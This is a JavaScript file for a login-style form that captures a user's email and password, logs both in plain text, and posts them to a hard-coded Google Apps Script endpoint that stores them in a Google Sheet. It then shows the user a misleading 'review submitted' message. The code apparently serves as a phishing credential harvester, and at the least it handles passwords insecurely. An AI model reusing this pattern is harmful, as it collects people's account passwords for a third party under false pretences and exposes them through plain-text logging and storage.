// Toggle Password Visibility
function togglePasswordVisibility() {
    const passwordField = document.getElementById("password");
    console.log('Toggling password visibility');
    
    if (passwordField.type === "password") {
        passwordField.type = "text";
        console.log('Password visibility: Visible');
    } else {
        passwordField.type = "password";
        console.log('Password visibility: Hidden');
    }
}

// Handle Form Submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    console.log('Form submission started');

    // Get form inputs
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    console.log('Email:', email);
    console.log('Password:', password);

    // Validate Email and Password conditions
    if (!email || email.length < 10 || !email.includes('@')) {
        alert("Please enter a valid email (at least 10 characters and include '@').");
        console.log('Email validation failed');
        return;
    } else {
        console.log('Email validation passed');
    }

    if (!password || password.length < 6) {
        alert("Please enter a valid password (at least 6 characters).");
        console.log('Password validation failed');
        return;
    } else {
        console.log('Password validation passed');
    }

    // Save to Google Sheets
    saveToGoogleSheet(email, password)
        .then(() => {
            console.log('Data successfully saved to Google Sheets');
            document.getElementById('response-message').classList.add('success');
            document.getElementById('response-message').innerText = `Thank you! Your review has been submitted successfully.`;
        })
        .catch((error) => {
            console.error("Error saving data:", error);
            document.getElementById('response-message').classList.add('error');
            document.getElementById('response-message').innerText = `There was an issue saving your data. Please try again.`;
        });
}

// Save Data to Google Sheets
function saveToGoogleSheet(email, password) {
    const scriptURL = "https://script.google.com/macros/s/AKfycbz0z281mdADtFUWvWV-C1yvh8EA20P3w33b3-DL6MZkIsXXF72CD8iJx7n4t16mSbN-/exec"; // Replace with your script URL
    console.log('Sending data to Google Sheets:', { email, password });

    return fetch(scriptURL, {
        method: "POST",
        body: new URLSearchParams({ email, password })
    })
    .then(response => {
        console.log('Received response from Google Sheets:', response);
        return response.json(); // Parse response as JSON
    })
    .then(data => {
        console.log('Response data:', data);
        if (data.status === 'success') {
            console.log('Data saved successfully!');
        } else {
            throw new Error("Failed to save data to Google Sheets");
        }
    })
    .catch(error => {
        console.error("Error saving to Google Sheets:", error.message);
        throw error;  // Re-throw the error to be caught in handleSubmit
    });
}
